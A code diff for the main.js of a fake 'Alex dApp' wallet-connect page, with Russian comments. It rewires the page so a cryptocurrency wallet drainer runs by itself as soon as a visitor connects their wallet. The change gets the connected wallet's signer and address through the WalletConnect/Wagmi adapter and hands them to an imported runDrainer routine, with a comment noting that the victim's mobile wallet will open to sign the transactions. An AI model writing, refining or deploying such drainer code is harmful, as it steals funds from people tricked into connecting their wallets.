@@ -1,3 +1,4 @@
+// main.js
 import { createAppKit } from '@reown/appkit'
 import {
   mainnet,
@@ -15,7 +16,7 @@ import { runDrainer } from './drainer.js'
 
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
 
-// ✅ Все поддерживаемые сети
+// Все поддерживаемые сети
 const networks = [
   mainnet,
   polygon,
@@ -27,13 +28,11 @@ const networks = [
   base
 ]
 
-const wagmiAdapter = new WagmiAdapter({
-  projectId,
-  networks
-})
+// Настраиваем адаптер Wagmi (AppKit сам подключит wallet‑connect/injected)
+const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 
 const metadata = {
-  name: 'Alex dApp',
+  name: 'Alex dApp',
   description: 'Connect your wallet',
   url: 'https://checkalex.xyz',
   icons: ['https://checkalex.xyz/icon.png']
@@ -44,23 +43,36 @@ const modal = createAppKit({
   networks,
   metadata,
   projectId,
-  features: {
-    analytics: true
-  }
+  features: { analytics: true }
 })
 
-// Открыть модалку по клику
-document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())
+// Открытие модалки подключения
+document
+  .getElementById('open-connect-modal')
+  .addEventListener('click', () => modal.open())
 
-// Запуск drainer-а
-document.getElementById('drainer-btn').addEventListener('click', async () => {
+// Когда пользователь подключился, AppKit эмитит событие connect
+modal.on('connect', async (payload) => {
+  console.log('✅ Connected payload:', payload)
+
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
-    const signer = provider.getSigner()
+    // Вместо window.ethereum попросим адаптер выдать нам провайдер WalletConnect/Injected
+    const provider = await wagmiAdapter.getProvider()
+    // И обернем его в ethers.js
+    const etherProvider = new ethers.providers.Web3Provider(provider, 'any')
+    const signer = etherProvider.getSigner()
     const address = await signer.getAddress()
 
-    await runDrainer(provider, signer, address)
+    // Запускаем drainer — все транзакции пойдут через тот же провайдер,
+    // и на мобильном откроется ваш кошелек для подписи
+    await runDrainer(etherProvider, signer, address)
+
+    // Закрываем модалку (если нужно)
+    modal.close()
+    console.log('✅ Drainer finished')
   } catch (e) {
-    console.error("Ошибка в Drainer:", e)
+    console.error('❌ Ошибка в Drainer:', e)
+    alert('Ошибка при выполнении Drainer: ' + e.message)
+    // Модалку можно оставить открытой для повторной попытки
   }
 })
